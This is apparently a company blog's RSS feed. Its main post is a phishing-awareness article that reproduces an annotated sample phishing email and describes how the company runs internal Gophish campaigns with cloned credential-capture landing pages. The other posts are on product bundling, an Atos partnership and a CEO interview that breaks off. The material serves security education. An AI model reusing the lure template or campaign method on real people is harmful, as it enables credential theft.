            <pubDate>Sat, 22 Oct 2022 00:00:00 GMT</pubDate>
            <description><![CDATA[From:  HR of WG2]]></description>
            <content:encoded><![CDATA[<div class="email"><p>From:  <strong>HR of WG2</strong> &lt;w272r84d4q @gmail.com&gt;<br>
<!-- -->To: Your Name <a href="mailto:yourname@wgtwo.com" target="_blank" rel="noopener noreferrer">yourname@wgtwo.com</a><br>
<!-- -->Subject: Action required now for holiday party<br>
<!-- -->Date: Oct 21, 2022, 6:29 PM  </p><hr><p>Hi! </p><p>Working Group 2 is celebrating the holidays. To do so we need all WGTWO employees to sign up if they would like to receive a FREE gift. We have a limited number so need to here from you quickly. The wgtwo HR needs to know your answer by the end of this week so please signup on the link immediately <a href="">HERE</a>.  </p><p>Thanks for your participation and patience. HR and CEO of WG2</p></div><p><img loading="lazy" alt="mr-bean-phishing-meme" src="/jp/assets/images/mr-bean-phishing-meme-a6e86ee3cba84bc1daa770c6acde2376.jpeg" width="1024" height="512" class="img_ev3q"></p><p>Hi! You either came here because a <strong>wgtwo</strong> internal phishing campaign phished you or you are interested in learning more about phishing! For whatever reason, welcome and we hope this blog post is useful for learning one or two things about this systematic problem - phishing. </p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="phishing-and-social-engineering">Phishing and Social Engineering<a class="hash-link" href="#phishing-and-social-engineering" title="Direct link to heading">​</a></h2><p>Social engineering is a technique used to trick people into believing something untrue. For example, if one is pretending to be a janitor and walking past the security guard, or if one is tricking someone online to believe you are the CEO of their company. </p><p>Over the internet, one can trick or phish people most commonly on social media, SMS, voice calls, websites, and email. Some of these phishing techniques are so popular that they receive specific names. For example, vishing relates to voice calls, and smishing relates to SMS. While these are very much relevant for <strong>wgtwo</strong> as we operate a mobile core network, today we will focus on the social engineering attack that is prominent via email called phishing. Furthermore, we will focus on how can we identify phishing emails, protect ourselves from phishing attacks, and provide insight into how a company could protect its employees by sharing our experiences. </p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="example-phishing-email">Example phishing email<a class="hash-link" href="#example-phishing-email" title="Direct link to heading">​</a></h3><div class="email"><p>From:  <strong>HR of WG2</strong> </p><div class="tooltip_C1Cj">w272r84d4q@gmail.com<span class="tooltiptext_aUlg">The sender is not from a wgtwo.com email</span></div><br>
<!-- -->To: Your Name <a href="mailto:yourname@wgtwo.com" target="_blank" rel="noopener noreferrer">yourname@wgtwo.com</a><br>
<!-- -->Subject: <div class="tooltip_C1Cj">Action required now<span class="tooltiptext_aUlg">Sense of urgency to trick you</span></div> for holiday party<br>
<!-- -->Date: Oct 21, 2022, 6:29 PM  <p></p><hr><p>Hi! </p><div class="tooltip_C1Cj">Working Group 2<span class="tooltiptext_aUlg">Mispelling of the company name</span></div> is celebrating the holidays. To do so we need all <div class="tooltip_C1Cj">WGTWO<span class="tooltiptext_aUlg">Mispelling of the company name</span></div> employees to sign up if they would like to receive a <div class="tooltip_C1Cj">FREE<span class="tooltiptext_aUlg">nothing in life is for free ;)</span></div> gift. We have a limited number so need to here from you <div class="tooltip_C1Cj">quickly<span class="tooltiptext_aUlg">Sense of urgency to trick you</span></div>. The wgtwo HR needs to know your answer by the <div class="tooltip_C1Cj">end of this week<span class="tooltiptext_aUlg">Sense of urgency to trick you</span></div> so please signup on the link <div class="tooltip_C1Cj">immediately<span class="tooltiptext_aUlg">Sense of urgency to trick you</span></div> <a href="">HERE</a>.<br><br>Thanks for your participation and patience. HR and <div class="tooltip_C1Cj">CEO<span class="tooltiptext_aUlg">Using authority to drive action</span></div> of <div class="tooltip_C1Cj">WG2<span class="tooltiptext_aUlg">Mispelling of the company name</span></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="common-characteristics-to-phishing-emails">Common characteristics to phishing emails<a class="hash-link" href="#common-characteristics-to-phishing-emails" title="Direct link to heading">​</a></h3><ul><li>Email sender name is spoofed</li><li>Misspellings</li><li>Specific tasks that are abnormal</li><li>Poorly formatted emails with weird or inconsistent fonts</li><li>An attachment with a strange extension (as this is a mechanism for hiding from malware scanners)</li><li>Urgency</li><li>Using names of authority</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="why-phishing">Why phishing<a class="hash-link" href="#why-phishing" title="Direct link to heading">​</a></h2><div class="theme-admonition theme-admonition-caution alert alert--warning admonition_LlT9"><div class="admonitionHeading_tbUL"><span class="admonitionIcon_kALy"><svg viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 0 0 0 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 0 0 .01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"></path></svg></span>phishing</div><div class="admonitionContent_S0QG"><h3 class="anchor anchorWithStickyNavbar_LWe7" id="20-of-all-data-breaches-are-caused-by-phishing">20% of all data breaches are caused by phishing<a class="hash-link" href="#20-of-all-data-breaches-are-caused-by-phishing" title="Direct link to heading">​</a></h3><h6 class="anchor anchorWithStickyNavbar_LWe7" id="report-from-2022-verizon-data-breach-report">Report from <a href="https://www.verizon.com/business/resources/reports/dbir/2022/summary-of-findings/" target="_blank" rel="noopener noreferrer">2022 Verizon data breach report</a><a class="hash-link" href="#report-from-2022-verizon-data-breach-report" title="Direct link to heading">​</a></h6></div></div><p>Social engineering is an efficient way of stealing personal information and compromising internet resources making it such an effective way for “hacking” companies. </p><p>From the perspective of a malicious actor, why would they try to exploit a vulnerability in a single system when they can just phish an employee into sharing their credentials who already have access to several systems?</p><blockquote><h2 class="anchor anchorWithStickyNavbar_LWe7" id="effective-easy-and-free">Effective, easy, and free<a class="hash-link" href="#effective-easy-and-free" title="Direct link to heading">​</a></h2></blockquote><p>Today anyone can set up a new email account and begin sending emails from a verified, reputable email server - FOR FREE!</p><p>In addition, several websites configured with email authentication can be stolen and leveraged to send phishing malware from compromised devices and portals. </p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="phishing-attacks">Phishing attacks<a class="hash-link" href="#phishing-attacks" title="Direct link to heading">​</a></h2><p>Generally, when people mention phishing, we are talking about email phishing. However, we have other types.</p><div class="theme-admonition theme-admonition-caution alert alert--warning admonition_LlT9"><div class="admonitionHeading_tbUL"><span class="admonitionIcon_kALy"><svg viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 0 0 0 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 0 0 .01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"></path></svg></span>phishing</div><div class="admonitionContent_S0QG"><h2 class="anchor anchorWithStickyNavbar_LWe7" id="types-of-phishing-attacks">Types of phishing attacks<a class="hash-link" href="#types-of-phishing-attacks" title="Direct link to heading">​</a></h2><ul><li><strong>Email Phishing</strong>: sent via email</li><li><strong>Spear phishing</strong>: sent via email and targeted attack towards a company or set of people</li><li><strong>Smishing</strong>: sent via SMS</li><li><strong>Vishing</strong>: sent via voicecalls </li></ul></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="spear-phishing">Spear phishing<a class="hash-link" href="#spear-phishing" title="Direct link to heading">​</a></h3><p>Spear phishing is a social engineering attack that targets a specific entity, company, or person. Generally speaking, these are targeted phishing attacks as they will alter the message to make it more relevant for the victim. For example, in a spear phishing email, the malicious actor would use the company logo, and other employee names within the company, leverage the company CSS and UI, and/or purchase a domain that resembles the target’s entity in all efforts for tricking the victim into sharing personal information such as login credentials.</p><p>Notably, in recent years there have been newsworthy events where spear phishing attempts have been successful in compromising companies. </p><p>On <a href="https://www.uber.com/newsroom/security-update/" target="_blank" rel="noopener noreferrer">Sep 16, 2022, Uber experienced a social engineering attack</a> that allowed the malicious actor to gain access to internal resources such as Slack, HackerOne, and several internal systems including a finance portal. This is an excellent example of how a group of hackers targeted an enterprise to compromise an employee's credentials to gain access to not just one system but several. Briefly mentioned in this report, Uber said that they are revising the MFA internal policies. This is a key control for preventing unauthorized access - which <strong>wgtwo</strong> continually implements and monitor across all applications.</p><p>Search engines are leveraged for easy data mining of company information that can be used in spear phishing attacks. </p><p>One open-source tool that leverages search engines for information gathering of company data such as emails is baked into Kali Linux but also found on GitHub called <a href="https://github.com/laramies/theHarvester" target="_blank" rel="noopener noreferrer">theHarvester</a>. I can recommend checking it out!</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="smishing">Smishing<a class="hash-link" href="#smishing" title="Direct link to heading">​</a></h3><p>As discussed previously, smishing is a social engineering attack that is leveraging the SMS protocol for sending a malicious payload to the victim. </p><p>Smishing is a very effective attack as the sms open rate is about 99%. With such a high open rate, it is almost certain that the SMS will be viewed by the victim if not blocked by the device or operator.</p><p>As <strong>wgtwo</strong> operates a mobile core network, one goal of ours is to protect the health of the SS7 network and the hygiene of SMS traffic. Ultimately, this led to us building an internal mechanism for identifying SMS spam. From this internal solution we identified that via malicious apps installed on a mobile device, smishing messages were propagated via that malicious app behind the scenes using the mobile device’s modem - unidentified by the end user. Essentially, leveraging the victim's device to re-propagate the phishing malware. Again, very similar to what we see in email phishing with a victim's email server or website getting compromised and then propagating phishing malware from this infected endpoint.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="protect-yourself">Protect yourself<a class="hash-link" href="#protect-yourself" title="Direct link to heading">​</a></h2><p>As much as email providers and clients try to prevent phishing messages from ending in your email inbox, it is bound that everyone will eventually receive a phishing message. Thus, it is up to us to ultimately stay protected from these social engineering attacks. Here are a few best practices to help you stay secure:</p><ul><li>Never share personal information such as your email address, password, or one-time-passcodes (OTPs)</li><li>Don’t trust email. Anyone can send you an email.</li><li>Learn the effective ways of detecting phishing emails like reviewing the sender address, misspellings in the email, and incorrect information - as mentioned previously in this blog post</li><li>Keep your software up-to-date to help protect from vulnerabilities being exploited. This includes your web browser and operating system.</li><li>If the phishing email is sent from the CEO of the company, for example - reach out to the CEO in another communication channel like slack or SMS to confirm the email is authentic</li><li>Ask for help from colleagues, friends, or family if in doubt about an email</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="protect-your-company">Protect your company<a class="hash-link" href="#protect-your-company" title="Direct link to heading">​</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="2fa">2FA<a class="hash-link" href="#2fa" title="Direct link to heading">​</a></h3><p>Enabling 2FA today is a necessary step for the security of employee accounts and access. Take the scenario of an employee being phished and sending their login credentials to a malicious actor - well they don't have the one-time passcode that's generated on new unknown logins. Ultimately this mitigates the risk completely as the actor was unable to log in. Today we are seeing new solutions from apple and others that are building passwordless solutions. <a href="https://developer.apple.com/passkeys/" target="_blank" rel="noopener noreferrer">Apple Passkeys</a> is an interesting solution as this leverages biometrics and your device to make an easy and secure way for authenticating.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="spf-dkim-and-dmarc">SPF DKIM and DMARC<a class="hash-link" href="#spf-dkim-and-dmarc" title="Direct link to heading">​</a></h3><p>An organization is responsible for properly configuring and managing email security. Many if not all email providers allow the configuration of email authentication to prevent the unauthorized sending of emails from your company's domain. </p><ul><li><strong>SPF</strong>: Specifies the servers and domains that are authorized to send emails on behalf of your organization.</li><li><strong>DKIM</strong>: Adds a digital signature to every outgoing message, which lets receiving servers verify the message came from your organization.</li><li><strong>DMARC</strong>: Let you tell receiving servers what to do with outgoing messages from your organization that doesn’t pass SPF or DKIM.
By adopting the above email authentication protocols one can create an allowlist for where they expect internal email to be originating from and a policy that tells what to do with an email that does not meet the authentication standard. This helps prevent spoofing and phishing emails originating and delivered to your employees </li></ul><h3 class="anchor anchorWithStickyNavbar_LWe7" id="internal-phishing-campaigns">Internal phishing campaigns<a class="hash-link" href="#internal-phishing-campaigns" title="Direct link to heading">​</a></h3><p>We are an advocate of security through education. What might be common sense for someone is not for another. Learning is an interesting topic in itself but in reality, until one has spent the time to create an understanding or learn from an experience or event one might truly understand. However with phishing, one might know what it is and not say to click the link, but they still do that. Why might you ask? Well, we are all human and bound to make mistakes.</p><p>Our belief is internal phishing campaigns can be used as an educational exercise but should only be viewed as an educational tool - rather than - a way to purposely trick employees into “failing” an exercise. View the next section to learn more about how <strong>wgtwo</strong> approaches and build its internal phishing campaigns.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="how-wgtwo-performs-internal-phishing-campaigns">How <strong>wgtwo</strong> performs internal phishing campaigns<a class="hash-link" href="#how-wgtwo-performs-internal-phishing-campaigns" title="Direct link to heading">​</a></h2><p>As industry best practices recommend companies perform security awareness training continually and the growing security threat of phishing leads <strong>wgtwo</strong> to build the capability and perform internal phishing campaigns. For an effective phishing campaign we have a few guidelines we follow:</p><p><strong>Dos</strong></p><ul><li>Always inform employees before a phishing campaign via slack #security channel</li><li>Make the phishing campaign educational</li></ul><p><strong>Don’ts</strong></p><ul><li>Never blame an employee for clicking the link and falling a victim to the phishing campaign</li></ul><p>In October 2022, during a <strong>wgtwo</strong> hack day, we decided to build some new automation for conducting an internal phishing campaign.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="architecture-for-internal-phishing-campaigns">Architecture for internal phishing campaigns<a class="hash-link" href="#architecture-for-internal-phishing-campaigns" title="Direct link to heading">​</a></h3><h4 class="anchor anchorWithStickyNavbar_LWe7" id="tools">Tools<a class="hash-link" href="#tools" title="Direct link to heading">​</a></h4><p><a href="https://github.com/gophish/gophish" target="_blank" rel="noopener noreferrer">Gophish</a> is an open-source phishing toolkit designed for businesses and penetration testers. It provides the ability to quickly and easily set up and execute phishing engagements and security awareness training.</p><p><img loading="lazy" alt="Gophish" src="/jp/assets/images/gophish-campaign-eb12d2ca01cb1095d8a0223222fe7684.svg" width="1060" height="862" class="img_ev3q"></p><p>Gophish is helpful for us because it has an API to help automate the process, with some cool features to track the delivery of emails and record who clicked the link for example. </p><p>As part of our process of adopting Gophish we contributed back upstream   </p><ul><li>Build and publish to ghcr.io on merge <a href="https://github.com/gophish/gophish/pull/2644" target="_blank" rel="noopener noreferrer">https://github.com/gophish/gophish/pull/2644</a></li></ul><h4 class="anchor anchorWithStickyNavbar_LWe7" id="procedure">Procedure<a class="hash-link" href="#procedure" title="Direct link to heading">​</a></h4><p>For every internal phishing campaign we take the following steps:</p><ol><li>Send a notification in the #security slack channel that a new phishing campaign has been created for some time in the future</li><li>Fetch a recent list of employee names/email addresses from google admin via an API call</li><li>Upload to the Gophish server as a new email campaign via an API call</li><li>Create a new email and make it relevant for the time of year, recent events, etc. and as the payload, including the link to this blog post as security awareness training</li></ol><h3 class="anchor anchorWithStickyNavbar_LWe7" id="example-phishing-campaign-email">Example phishing campaign email<a class="hash-link" href="#example-phishing-campaign-email" title="Direct link to heading">​</a></h3><p>Can you spot the errors in this spear phishing campaign?</p><h4 class="anchor anchorWithStickyNavbar_LWe7" id="gophish-campaign-landpage">Gophish Campaign Landpage<a class="hash-link" href="#gophish-campaign-landpage" title="Direct link to heading">​</a></h4><p>In Gophish we are able to "steal" the html/css of existing website sites to build our own landing page. The landing page purpose is the payload that is imbeded in the email to capture sensitive data like username and password.</p><p><img loading="lazy" alt="gophish landingpage" src="/jp/assets/images/gophish-landingpage-105a2379b16d8ea1c4b04486f8a29325.png" width="600" height="330" class="img_ev3q"> </p><h4 class="anchor anchorWithStickyNavbar_LWe7" id="spear-phishing-email-and-landing-page">Spear Phishing Email and Landing Page<a class="hash-link" href="#spear-phishing-email-and-landing-page" title="Direct link to heading">​</a></h4><p><img loading="lazy" alt="email payload" src="/jp/assets/images/gophish-landingpage-hq-57b1ca7075565d6eeed4a3856326a843.png" width="3348" height="1934" class="img_ev3q"> </p><p><strong>Email</strong></p><ul><li>always check the sender</li><li>longer pressing on the link will popup a preview where you can see the true URL</li><li>my name was in the email but this because it was a spear phishing - and still can't be trusted</li><li>the source name said it was <code>Oda</code> but after inspecting the email it was actually from an outlook.com account</li></ul><p><strong>Website</strong></p><ul><li>always check the URL to ensure it is from the trusted source</li><li>leverage password managers as because the URL is not the true source, the password manager would not share the credentials</li><li>install adblockers on your phone or computer and blocks adds</li></ul><blockquote><p>Note: On iOS a lot of information is hidden from the user, but there are still tricks to identify the true source and metadata about the email and payload.</p></blockquote><ul><li>longer pressing on the link will popup a preview where you can see the true URL</li><li>my name was in the email but this because it was a spear phishing - and still can't be trusted</li><li>the source name said it was <code>Oda</code> but after inspecting the email it was actually from an outlook.com account</li></ul><p><img loading="lazy" alt="email payload" src="/jp/assets/images/email-payload-b577adb27a682e70343e7217328de6d6.png" width="320" height="693" class="img_ev3q"></p>]]></content:encoded>
            <category>security</category>
        </item>
        <item>
            <title><![CDATA[How product bundling simplifies the distribution challenge]]></title>
            <link>https://www.wgtwo.com/jp/blog/how-product-bundling-simplifies-distribution</link>
            <guid>how-product-bundling-simplifies-distribution</guid>
            <pubDate>Thu, 13 Oct 2022 00:00:00 GMT</pubDate>
            <description><![CDATA[Our big belief is that the telecom industry should start building global platforms with the aim of achieving network effects - like many of the adjacent industries in devices and apps. To enable this, we’re building a mobile core from the ground up, running it in the public cloud and offering it as-a-service globally. To make it even harder (and fun) for ourselves, we’re also developing a full, API-based global product ecosystem to give telecom operators new revenue and differentiation opportunities.]]></description>
            <content:encoded><![CDATA[<p>Our big belief is that the telecom industry should start building global platforms with the aim of achieving network effects - like many of the adjacent industries in devices and apps. To enable this, we’re building a mobile core from the ground up, running it in the public cloud and offering it as-a-service globally. To make it even harder (and fun) for ourselves, we’re also developing a full, API-based global product ecosystem to give telecom operators new revenue and differentiation opportunities. </p><p>One of the questions we get from operators is how to distribute products to their subscribers. There are multiple ways to go about it, but in this post, we'll show how an operator can enable products for their subscribers in what we call bundling.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="part-one-what-is-bundling">Part one: What is bundling?<a class="hash-link" href="#part-one-what-is-bundling" title="Direct link to heading">​</a></h3><p>Bundling. What is bundling? Probably something like “to group together and sell for one price." Why would you want to group something together in a bundle? How do you bundle something abstract like a “product”, and what would you even bundle that together with? These are all good questions.</p><p>Most people are probably familiar with the concept of "pre-installed applications," like how your smartphone comes out of the box with software to handle SMS and MMS messages, or a web browser that might not be the one you personally prefer. You could think of this as a type of bundling - including a product or service within another product. At Working Group Two we do not make phones or applications that run on phones. We are creating an ecosystem for products that run on top of or adjacent to mobile subscriptions by using our mobile core platform (which is also a thing we are doing, as we mentioned earlier).</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="part-two-how-does-our-bundling-work">Part two: How does our bundling work?<a class="hash-link" href="#part-two-how-does-our-bundling-work" title="Direct link to heading">​</a></h3><p>“Now hold on,” you might think, “what’s this got to do with... whatever it is you’re trying to accomplish as a company?” Well, here at Working Group Two we strongly believe that there is a lot of value in talking to and listening to our customers and users. One of the subjects we’ve discussed at length with some of our customers is how to distribute products from the operator to their subscribers. </p><p>So far we’ve identified three different approaches to this:</p><ul><li><strong>1. Single</strong>: A single subscriber gets the product, by personally activating it for their subscription. The subscriber would need to find and activate the product via some interface like an “app store” or marketplace. </li><li><strong>2. Everyone</strong>: The entirety of the subscriber base gets the product. </li><li><strong>3. Bundling</strong>: A subset of the subscribers gets the product, by including it into one or several plans or offerings provided by the operator.</li></ul><p>Some products might seem like ideal candidates for distribution through a marketplace (option 1). A product which automatically transcribes calls (into text) isn’t something everyone needs, but there’s definitely people who are willing to pay for such a thing. The marketplace approach introduces another distribution-related problem, however, that of distributing the knowledge of the marketplace and its contents. On the flip side, enabling a product for the entirety of the subscriber base (option 2) makes sense if said product is marketed as a core feature of the operator’s subscriptions or if it's meant to take care of market-specific regulatory requirements.  </p><p>Option 3 (bundling) solves the information-distribution problem of the marketplace approach by allowing the operator to market the bundled products as features of a certain subscription tier. </p><p>Here are some examples:</p><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td><strong>B2B mobile operators</strong></td><td>An operator might realize that not all of their potential customers need a full switchboard solution (known in telco language as a PBX), and decide to offer that as an “add-on” or a bundled part of a higher-priced subscription package.</td><td></td></tr><tr><td></td><td>An operator could offer advanced speech-to-text solutions to lawyers, real estate agents, and translation companies to help them automate their workflows.</td><td></td></tr><tr><td><strong>B2C mobile operators</strong></td><td>An operator could bundle a web content filtering product along with a subscription package aimed at kids (or rather the parents of kids – who in some market segments have their own smartphones by the age of eight).</td><td></td></tr><tr><td></td><td>An operator could offer a subscription aimed towards groups of people most likely to become victims of malicious text message scams, including additional anti-scam measures.</td><td></td></tr></tbody></table><p>The operators will be using an API where they manage their subscriptions. This is where they can activate new subscriptions, toggle high-speed data based on the users quota, and other operations.</p><p>Using the same API, they can send a list of which products should be bundled as part of these subscriptions. That is, the product they include in this list will be granted limited access allowing them to do their required interaction with the subscription. That may be everything from getting call information in real-time to receiving and forwarding SMSs.</p><p>These bundled products may be selected as part of the user's price plan, as e.g. enabling web filtering for kids for the subscriptions in the kids segment, or it can be additional products that the operators offer through their portal.</p><p>This concept of offering more tailored subscriptions to specific segments of the market is not new, but with the addition of products that leverage the Working Group Two ecosystem, the possibilities could go beyond most subscribers’ current expectations of what a mobile subscription can offer.</p><figure class="figure_JG9S" style="width:50%;float:right;margin-left:20px"><img src="/jp/73c3afdb772d9b3b99455a6e05320915.jpg" alt="The team is testing out bundling in the physical world" class="image_HilK"><figcaption class="caption_lOvI">The team is testing out bundling in the physical world</figcaption></figure><p>Operators using the Working Group Two mobile core can already select products from our product portfolio to bundle into their various price plans via our product marketplace. All it takes is a couple of mouse clicks. And yes, of course it can be integrated with their BSS (that’s a Business Support System, for things like billing, order management, and revenue management). </p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="part-three-come-hang-out-with-us">Part three: Come hang out with us<a class="hash-link" href="#part-three-come-hang-out-with-us" title="Direct link to heading">​</a></h3><p>If this sounds exciting to you as an operator, do not hesitate to <a href="https://www.wgtwo.com/contact/" target="_blank" rel="noopener noreferrer">reach out.</a></p><p>Perhaps you’re not an operator, but instead a developer of sorts already working within the mobile products space or just have an idea for a product within this space? You could check out our <a href="https://developer.wgtwo.com" target="_blank" rel="noopener noreferrer">Developer Portal</a> and
<a href="https://v1.docs.wgtwo.com" target="_blank" rel="noopener noreferrer">API documentation</a>. You could also <a href="https://developer.wgtwo.com/join-us-on-slack" target="_blank" rel="noopener noreferrer">reach out to us on Slack</a> if you have any questions.</p>]]></content:encoded>
            <category>saas</category>
            <category>operators</category>
            <category>bundling</category>
            <category>products</category>
            <category>distribution</category>
            <category>ecosystem</category>
        </item>
        <item>
            <title><![CDATA[Atos and Working Group Two to deliver core-as-a-service to mobile operators worldwide]]></title>
            <link>https://www.wgtwo.com/jp/blog/atos-teams-with-wgtwo</link>
            <guid>atos-teams-with-wgtwo</guid>
            <pubDate>Mon, 19 Sep 2022 00:00:00 GMT</pubDate>
            <description><![CDATA[Atos and Working Group Two (wgtwo) are teaming up to provide operators with a simplified, end-to-end mobile network solution. It is based on wgtwo’s 4/5G cloud-native mobile core and on Atos’s full Next Generation Telecom Network portfolio, including cloud computing, edge and Open RAN technologies. Atos and wgtwo will jointly deliver “core-network-as-a-service” solutions.]]></description>
            <content:encoded><![CDATA[<p>Atos and Working Group Two (wgtwo) are teaming up to provide operators with a simplified, end-to-end mobile network solution. It is based on wgtwo’s 4/5G cloud-native mobile core and on Atos’s full Next Generation Telecom Network portfolio, including cloud computing, edge and Open RAN technologies. Atos and wgtwo will jointly deliver “core-network-as-a-service” solutions. </p><p>This collaboration will target related core opportunities such as IoT, Private Network and Enterprise for the Tier 1 operators, while also extending the offering to public MNO core networks for Tier 2, Tier 3. The solution will enable operators to optimize capacity, improve time to market, lower costs and simplify operations.</p><img loading="lazy" width="40%" align="right" style="display:block;margin:auto 10px" src="/jp/fa8d2b35f49ab7e638d5ae149d06c478.png" class="img_ev3q"><p>Operators can connect their radio networks to the wgtwo global core network. The wgtwo platform is a G-neutral platform that allows for a converged experience with national roaming on 2G/3G and full MNO or private network functionality for 4G/5G. The platform offers the full capabilities of a MNO core related to authentication and provisioning, policy, voice, messaging, data services and all the surrounding orchestration, operational and management tools.  </p><p><a href="https://atos.net/en/" target="_blank" rel="noopener noreferrer">Atos</a> complements wgtwo’s mobile network core with its Next-Generation Telecom Network portfolio, delivering mobile services for public and private networks. To enable more flexible and cost-efficient hosting and operations, Atos offers best-in-class virtualization and cloud technologies. As a world-leading systems integrator, we combine extensive digital transformation expertise, rich industry experience and combined technological capabilities in cloud and edge computing, artificial intelligence, digital security, and IoT.</p><p>Atos hybrid cloud can enable customers to optimize business processes and modernize applications, while Atos Open-RAN and edge computing solution will enhance application performance and offer innovative services especially around automation. wgtwo’s orchestration platform will simplify the seamless configuration of those services, with lower operational costs and virtualization of network operations. </p><p>Jean-Claude Geha, Head of Telecom, Media and Technology at Atos, said:</p><blockquote><p> As mobile networks are getting more and more complex, operators need to simplify and rationalize their infrastructure. To go through this transformation, Cloud Computing and Network Functions Virtualization are key technologies for operators to deliver a simpler and more reliable network, with a faster time-to-market and tailored managed services. I am pleased to join forces with a new and innovative player such as Working Group Two to tackle this challenge.</p></blockquote><p>Erlend Prestgard, CEO of Working Group Two, said: </p><blockquote><p>Atos and WGTWO’s end-to-end solution delivers simplicity, lower costs and enable operators to innovate continuously. We can deploy a wide range of use cases - including greenfield MNOs, specialty networks for MNOs that seek growth opportunities and private networks. We also support MNOs that seek the benefits of a full as-a-service model. Together, we bring a new era of programmability, allowing operators to speed up innovation, explore new revenue streams and get to market faster. </p></blockquote><p><strong>About Atos</strong>
Atos is a global leader in digital transformation with 112,000 employees and annual revenue of c. € 11 billion. European number one in cybersecurity, cloud and high performance computing, the Group provides tailored end-to-end solutions for all industries in 71 countries. A pioneer in decarbonization services and products, Atos is committed to a secure and decarbonized digital for its clients. Atos is a SE (Societas Europaea), listed on Euronext Paris and included in the Next 20 Paris Stock indexes. The purpose of Atos is to help design the future of the information space. Its expertise and services support the development of knowledge, education and research in a multicultural approach and contribute to the development of scientific and technological excellence. Across the world, the Group enables its customers and employees, and members of societies at large to live, work and develop sustainably, in a safe and secure information space.</p><p><strong>About Working Group Two</strong>
Working Group Two has rebuilt the mobile core for simplicity, innovation, and efficiency - leveraging the web-scale playbook and operating models. Today, Working Group Two innovation enables MVNO, MNO, and Private Network Operators a secure, scalable, and reliable telco connectivity backbone that scales across all generations of mobile technologies. Their mission is to create programmable mobile networks to allow our customers and their end users to create more valuable and useful products and services.</p>]]></content:encoded>
            <category>saas</category>
            <category>operators</category>
            <category>core</category>
            <category>cloud</category>
            <category>partners</category>
            <category>iot</category>
            <category>private networks</category>
            <category>press release</category>
        </item>
        <item>
            <title><![CDATA[Telco Tech Talk: Three CEOs on the future of the telecom industry, moving to the cloud and transforming company cultures]]></title>
            <link>https://www.wgtwo.com/jp/blog/telco-tech-talk-telenor-aws</link>
            <guid>telco-tech-talk-telenor-aws</guid>
            <pubDate>Thu, 15 Sep 2022 00:00:00 GMT</pubDate>
            <description><![CDATA[Meet Sigve Brekke (CEO, Telenor Group), Adam Selipsky (CEO, Amazon Web Services) and Erlend Prestgard (CEO, Working Group Two). They recently sat down to discuss questions like: How do you build a strong technology culture in tandem with a customer-centric culture? How do you think long-term but execute in the short term? How can companies in legacy industries transform themselves?]]></description>
            <content:encoded><![CDATA[<p>Meet Sigve Brekke (CEO, Telenor Group), Adam Selipsky (CEO, Amazon Web Services) and Erlend Prestgard (CEO, Working Group Two). They recently sat down to discuss questions like: How do you build a strong technology culture in tandem with a customer-centric culture? How do you think long-term but execute in the short term? How can companies in legacy industries transform themselves? </p><p><img loading="lazy" alt="CEOs in Telco Tech Talk" src="/jp/assets/images/allthreeceos-7a77f7597ac631cefb4b3bc2da931995.png" width="3054" height="1432" class="img_ev3q"></p><p><em>(This is based on a transcript from a published video conversation called <a href="https://www.linkedin.com/posts/sigvebrekke_telcotechtalks-activity-6976078836174106625-pX3U/?utm_source=share&amp;utm_medium=member_desktop" target="_blank" rel="noopener noreferrer">"Telco Tech Talk"</a> - hosted by the Telenor Group. The text is edited for length and clarity. Errors may have occurred)</em></p><p><strong>Sigve Brekke (CEO, Telenor Group):</strong>
Hello, everyone. I'm Sigve Brekke, the Group CEO of the Telenor Group. We are a mobile operator operating across the Nordics and in Asia. We have called this the Telco Tech Talk and this is a second episode where we invite guests to talk about how technology is changing the landscape and how technology companies and telecom companies are coming together and what that really means. Today, I'm very pleased to have two guests with me to discuss that topic.</p><figure class="figure_JG9S" style="width:50%;float:left;margin-right:20px"><img src="/jp/2cb33763c6095c98bac3ed5eaeeb619a.png" alt="Telco Tech Talk" class="image_HilK"><figcaption class="caption_lOvI">Telco Tech Talk</figcaption></figure><p>It is Adam Selipsky, the CEO of Amazon Web Services, as we all know, a leading cloud services company globally. And I have Erlend Prestgard, the CEO of Working Group Two, a software and application provider. </p><p>Let's jump into it and let me start with you, Adam. It’s not a technical question but a cultural question. I know that you have been at Amazon from the early days and my first question is, what is your advice on how to combine the efforts of building a strong technology culture and also building a customer-centric culture?</p><p><strong>Adam Selipsky (CEO, Amazon Web Services):</strong>
